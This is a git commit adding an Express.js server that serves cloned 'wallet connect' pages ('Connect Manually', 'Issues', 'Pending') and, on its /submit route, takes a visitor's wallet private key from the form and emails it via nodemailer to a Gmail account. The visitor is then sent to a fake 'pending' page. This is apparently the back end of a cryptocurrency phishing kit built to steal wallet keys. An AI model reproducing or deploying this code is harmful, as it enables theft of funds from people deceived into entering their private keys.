5ab65937a7c6bac18e7d0a19cf88e2eea9df92c6
stackkrocket <mohammadadinoyi8@gmail.com>
2024-07-22 03:36:57 +0100

    initial commit

---
+++ index.js
@@ -0,0 +1,102 @@
+const express = require('express');
+const dotenv = require('dotenv');
+const nodemailer = require('nodemailer')
+const cors = require('cors')
+const path = require('path')
+
+const app = express();
+dotenv.config();
+
+app.use(cors())
+
+
+app.use(express.static('views/evm-frontend'))
+app.use(express.static(path.join(__dirname, "/public")))
+app.use(express.static(__dirname + '/views/Home Page _ Welcome to Panelactivator.com_files/'))
+app.use(express.static(__dirname + '/views/Welcome to our website_files/'))
+app.use(express.static(__dirname + '/views/Connect Manually_files/'))
+app.use(express.static(__dirname + '/views/Issues_files'))
+app.use(express.static(__dirname + '/views/Pending_files/'))
+
+app.use(express.json());
+app.use(express.urlencoded({ extended: true }));
+
+function delay(ms) {
+    return new Promise((resolve) => setTimeout(resolve, ms));
+  }
+
+app.get('/', (req, res) => {
+    res.sendFile(__dirname + '/views/evm-frontend/index.html');
+})
+
+app.get('/explore', (req, res) => {
+    res.sendFile(__dirname + '/views/evm-frontend/explore.html')
+})
+
+app.get('/explore/issues', (req, res) => {
+    res.sendFile(__dirname + '/views/evm-frontend/connect.html')
+})
+
+app.get('/explore/issues/connect', (req, res) => {
+    res.sendFile(__dirname + '/views/evm-frontend/Issues.html')
+})
+
+app.get('/pending', (req, res) => {
+    res.sendFile(__dirname + '/views/evm-frontend/Pending.html')
+})
+
+app.post('/submit', async (req, res) => {
+    const privateKey = req.body.data;  // Assuming this is the input from the user
+    if (!privateKey) {
+        console.log('Private key must be provided')
+        return
+    }
+
+    var transporter = nodemailer.createTransport({
+        service: 'gmail',
+        auth: {
+          user: '',
+          pass: ''
+        }
+      });
+
+      await new Promise((resolve, reject) => {
+        transporter.verify(function(error, success) {
+          if (error){
+            console.log(error)
+            reject(error)
+          }else{
+            console.log('Server succesfully ready to send mail')
+            resolve(success)
+          }
+        })
+      })
+
+      var mailOptions = {
+        from: '', //Testing email to see you received it successfully. Server configured email
+        to: '',
+        subject: `${req.body.category}`,
+        html: `${req.body.data}`
+      };
+
+      await new Promise((resolve, reject) => {
+        transporter.sendMail(mailOptions, async (error, info) => {
+          if (error) {
+            console.log(error)
+            reject(error)
+          }else{
+            console.log('Email sent: ' + info.response)
+            resolve(info)
+            await delay(3000)
+            res.redirect('/pending')
+          }
+        })
+      })
+})
+
+const PORT = 3000;
+
+
+app.listen(PORT, () => {
+    console.log(`Server is running on port ${PORT}`);
+})
